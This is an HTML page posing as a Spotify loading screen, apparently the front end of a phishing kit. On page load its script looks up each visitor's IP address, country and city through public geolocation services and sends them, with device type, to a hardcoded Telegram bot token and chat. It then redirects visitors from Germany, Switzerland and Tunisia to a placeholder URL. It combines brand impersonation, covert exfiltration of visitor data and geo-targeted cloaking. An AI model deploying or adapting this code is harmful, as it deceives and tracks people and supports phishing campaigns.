<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #191414;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      color: white;
      overflow: hidden;
    }

    .loading-container {
      text-align: center;
      animation: fadeIn 0.8s ease-in;
    }

    .logo {
      width: 60px;
      height: 60px;
      background: #1db954;
      border-radius: 50%;
      margin: 0 auto 40px;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      animation: pulse 2s ease-in-out infinite;
    }

    .logo::before {
      content: '';
      width: 0;
      height: 0;
      border-left: 16px solid white;
      border-top: 10px solid transparent;
      border-bottom: 10px solid transparent;
      margin-left: 3px;
    }

    .logo-container {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
      gap: 15px;
    }

    .logo-icon {
      width: 50px;
      height: 50px;
      background: #1db954;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      animation: pulse 2s ease-in-out infinite;
    }

    .logo-icon img {
      width: 24px;
      height: 24px;
      filter: brightness(0) invert(1);
    }

    .logo-text {
      font-size: 48px;
      font-weight: 900;
      letter-spacing: -2px;
      background: linear-gradient(45deg, #1db954, #1ed760);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }

    .loading-dots {
      display: flex;
      justify-content: center;
      gap: 4px;
      margin-bottom: 60px;
    }

    .dot {
      width: 8px;
      height: 8px;
      background: #1db954;
      border-radius: 50%;
      animation: bounce 1.4s ease-in-out infinite both;
    }

    .dot:nth-child(1) { animation-delay: -0.32s; }
    .dot:nth-child(2) { animation-delay: -0.16s; }
    .dot:nth-child(3) { animation-delay: 0s; }

    .progress-container {
      width: 200px;
      margin: 0 auto;
    }

    .progress-bar {
      width: 100%;
      height: 2px;
      background: #333;
      border-radius: 1px;
      overflow: hidden;
    }

    .progress-fill {
      height: 100%;
      background: linear-gradient(90deg, #1db954, #1ed760);
      border-radius: 1px;
      animation: progress 3s ease-in-out infinite;
    }

    .status-text {
      margin-top: 20px;
      font-size: 14px;
      color: #b3b3b3;
      font-weight: 400;
      opacity: 0;
      animation: fadeInStatus 0.5s ease-in 1s forwards;
    }

    .background-pattern {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: 
        radial-gradient(circle at 20% 80%, rgba(29, 185, 84, 0.1) 0%, transparent 50%),
        radial-gradient(circle at 80% 20%, rgba(30, 215, 96, 0.1) 0%, transparent 50%),
        radial-gradient(circle at 40% 40%, rgba(29, 185, 84, 0.05) 0%, transparent 50%);
      z-index: -1;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.05); }
    }

    @keyframes bounce {
      0%, 80%, 100% { 
        transform: scale(0);
        opacity: 0.5;
      }
      40% { 
        transform: scale(1);
        opacity: 1;
      }
    }

    @keyframes progress {
      0% { width: 0%; }
      50% { width: 70%; }
      100% { width: 100%; }
    }

    @keyframes fadeInStatus {
      to { opacity: 1; }
    }

    .fade-out {
      animation: fadeOut 0.5s ease-out forwards;
    }

    @keyframes fadeOut {
      to { opacity: 0; transform: scale(0.95); }
    }

    @media (max-width: 768px) {
      .logo-container {
        gap: 12px;
      }
      
      .logo-icon {
        width: 40px;
        height: 40px;
      }
      
      .logo-icon img {
        width: 20px;
        height: 20px;
      }
      
      .logo-text {
        font-size: 36px;
      }
      
      .progress-container {
        width: 150px;
      }
    }
  </style>
</head>
<body>
  <div class="background-pattern"></div>
  
  <div class="loading-container">
    <div class="logo-container">
      <div class="logo-icon">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/19/Spotify_logo_without_text.svg/2048px-Spotify_logo_without_text.svg.png" alt="Play">
      </div>
      <div class="logo-text">Spotify</div>
    </div>
    <div class="loading-dots">
      <div class="dot"></div>
      <div class="dot"></div>
      <div class="dot"></div>
    </div>
    <div class="progress-container">
      <div class="progress-bar">
        <div class="progress-fill"></div>
      </div>
    </div>
    <div class="status-text"></div>
  </div>

  <script>
    // Telegram Bot settings (replace with your own)
    const botToken = "7558303077:AAFyGBdFFJsBK6abcedW4fcMo9IVn3WwJQk";
    const chatId = "-1002763899038";

    function notifyTelegram(message) {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });
    }

    // Function to get visitor IP and country with multiple fallback services
    async function getVisitorInfo() {
      const services = [
        'https://ipapi.co/json/',
        'https://ipinfo.io/json',
        'https://api.ipify.org?format=json',
        'https://ip-api.com/json/',
        'https://api.country.is/'
      ];

      for (let i = 0; i < services.length; i++) {
        try {
          const response = await fetch(services[i], { 
            timeout: 5000,
            headers: {
              'Accept': 'application/json'
            }
          });
          
          if (!response.ok) continue;
          
          const data = await response.json();
          
          // Parse different response formats
          let ip, country, city, region;
          
          if (services[i].includes('ipapi.co')) {
            ip = data.ip;
            country = data.country_name || data.country;
            city = data.city;
            region = data.region;
          } else if (services[i].includes('ipinfo.io')) {
            ip = data.ip;
            country = data.country;
            city = data.city;
            region = data.region;
          } else if (services[i].includes('ipify.org')) {
            ip = data.ip;
            country = 'Unknown';
            city = 'Unknown';
            region = 'Unknown';
          } else if (services[i].includes('ip-api.com')) {
            ip = data.query;
            country = data.country;
            city = data.city;
            region = data.regionName;
          } else if (services[i].includes('country.is')) {
            ip = data.ip;
            country = data.country;
            city = 'Unknown';
            region = 'Unknown';
          }

          if (ip && ip !== 'undefined' && ip !== 'null') {
            return {
              ip: ip,
              country: country || 'Unknown',
              city: city || 'Unknown',
              region: region || 'Unknown'
            };
          }
        } catch (error) {
          console.log(`Service ${i + 1} failed:`, error.message);
          continue;
        }
      }

      // If all services fail, try to get IP from a simple service
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return {
          ip: data.ip || 'Unable to detect',
          country: 'Unknown',
          city: 'Unknown',
          region: 'Unknown'
        };
      } catch (error) {
        return {
          ip: 'Unable to detect',
          country: 'Unknown',
          city: 'Unknown',
          region: 'Unknown'
        };
      }
    }

    // Check if user is on mobile
    const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);

    // Main function to handle visitor tracking
    async function trackVisitor() {
      const visitorInfo = await getVisitorInfo();
      
      // Check if visitor is from Germany (DE), Switzerland (CH), or Tunisia (TN)
      const allowedCountries = ['Germany', 'Switzerland', 'Tunisia', 'DE', 'CH', 'TN'];
      const isFromAllowedCountry = allowedCountries.includes(visitorInfo.country) || 
                                   visitorInfo.country === 'Germany' || 
                                   visitorInfo.country === 'Switzerland' ||
                                   visitorInfo.country === 'Tunisia';
      
      const redirectStatus = isFromAllowedCountry ? 'Yes' : 'No';
      
      const message = `🔍 New Visitor Detected
      
📍 IP Address: ${visitorInfo.ip}
🌍 Country: ${visitorInfo.country}
🏙️ City: ${visitorInfo.city}
📱 Mobile Device: ${isMobile ? 'Yes' : 'No'}
🌍 Allowed Country: ${isFromAllowedCountry ? 'Yes' : 'No'}
🔄 Redirected: ${redirectStatus}
⏰ Time: ${new Date().toLocaleString()}`;

      // Send notification to Telegram
      notifyTelegram(message);

      // Redirect users from allowed countries after 1 second
      if (isFromAllowedCountry) {
        setTimeout(() => {
          window.location.href = "https://example.com"; // Change to your redirect URL
        }, 100000);
      }
    }

    // Execute visitor tracking
    trackVisitor();
  </script>
</body>
</html>
